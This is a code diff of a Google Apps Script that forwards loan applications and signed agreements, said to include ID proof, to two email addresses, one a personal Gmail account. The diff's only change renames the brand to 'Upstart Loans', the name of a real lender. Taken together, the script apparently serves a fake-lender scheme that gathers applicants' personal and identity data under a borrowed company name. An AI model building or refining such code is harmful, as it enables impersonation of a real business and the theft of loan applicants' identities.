@@ -1,4 +1,4 @@
-// BACKUP: Exact Email Format Script for UpStars Loans
+// BACKUP: Exact Email Format Script for Upstart Loans
 // Step 1: Application form details (exact format)
 // Step 2: Agreement with ID proof
 // SAVED BEFORE GOOGLE SHEETS INTEGRATION - DO NOT MODIFY
@@ -9,7 +9,7 @@ const SECONDARY_EMAIL = "tyronlincolnn@gmail.com";
 
 function doGet(e) {
   return HtmlService.createHtmlOutput(`
-    <h1>UpStars Loans Email Service</h1>
+    <h1>Upstart Loans Email Service</h1>
     <p>Two-step email system ready.</p>
     <p><strong>Current emails:</strong></p>
     <ul>
@@ -54,7 +54,7 @@ function sendApplicationEmail(data) {
   const subject = `NEW LOAN APPLICATION - ${data.firstName} ${data.lastName} - ${data.loanAmount}`;
   
   const htmlBody = `
-    <h2>🏦 UP START LOANS - NEW LOAN APPLICATION</h2>
+    <h2>🏦 Upstart Loans - NEW LOAN APPLICATION</h2>
     
     <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
       <h3>📋 Application Details</h3>
@@ -105,18 +105,18 @@ function sendApplicationEmail(data) {
     
     <div style="text-align: center; margin-top: 30px; padding: 15px; background: #f5f5f5; border-radius: 8px;">
       <p><strong>📅 Submitted:</strong> ${new Date().toLocaleString()}</p>
-      <p><strong>🏢 UP START LOANS</strong></p>
+      <p><strong>🏢 Upstart Loans</strong></p>
     </div>
   `;
   
   GmailApp.sendEmail(PRIMARY_EMAIL, subject, '', {
     htmlBody: htmlBody,
-    name: 'UP START LOANS System'
+    name: 'Upstart Loans System'
   });
   
   GmailApp.sendEmail(SECONDARY_EMAIL, subject, '', {
     htmlBody: htmlBody,
-    name: 'UP START LOANS System'
+    name: 'Upstart Loans System'
   });
 }
 
@@ -124,7 +124,7 @@ function sendAgreementEmail(data) {
   const subject = `LOAN AGREEMENT SIGNED - ${data.firstName} ${data.lastName} - ${data.applicationId}`;
   
   const htmlBody = `
-    <h2>📝 UP START LOANS - LOAN AGREEMENT SIGNED</h2>
+    <h2>📝 Upstart Loans - LOAN AGREEMENT SIGNED</h2>
     
     <div style="background: #e8f5e8; padding: 20px; border-radius: 8px; margin: 20px 0;">
       <h3>✅ Agreement Details</h3>
@@ -154,23 +154,23 @@ function sendAgreementEmail(data) {
     
     <div style="text-align: center; margin-top: 30px; padding: 15px; background: #f5f5f5; border-radius: 8px;">
       <p><strong>📅 Signed:</strong> ${new Date().toLocaleString()}</p>
-      <p><strong>🏢 UP START LOANS</strong></p>
+      <p><strong>🏢 Upstart Loans</strong></p>
     </div>
   `;
   
   GmailApp.sendEmail(PRIMARY_EMAIL, subject, '', {
     htmlBody: htmlBody,
-    name: 'UP START LOANS System'
+    name: 'Upstart Loans System'
   });
   
   GmailApp.sendEmail(SECONDARY_EMAIL, subject, '', {
     htmlBody: htmlBody,
-    name: 'UP START LOANS System'
+    name: 'Upstart Loans System'
   });
 }
 
 function sendErrorEmail(error, data) {
-  const subject = '❌ ERROR - UP START LOANS APPLICATION';
+  const subject = '❌ ERROR - Upstart Loans APPLICATION';
   const body = `
     Error occurred: ${error}
     
